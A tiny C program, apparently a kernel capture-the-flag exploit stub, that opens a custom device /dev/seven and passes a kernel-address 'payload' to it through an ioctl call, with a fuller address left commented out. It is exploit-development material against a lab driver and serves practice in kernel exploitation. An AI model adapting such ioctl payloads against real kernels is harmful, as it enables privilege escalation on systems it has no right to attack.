#include <stddef.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>


int main() {
  int seven_fd = open("/dev/seven", O_RDWR);
  if(seven_fd < 0) {
    puts("[*]open /dev/seven error!");
    exit(0);
  }
  //long long payload = 0xffffffff8262b32b;
  long long payload = 0xffffffff82;
  ioctl(seven_fd, 21845,&payload);
}
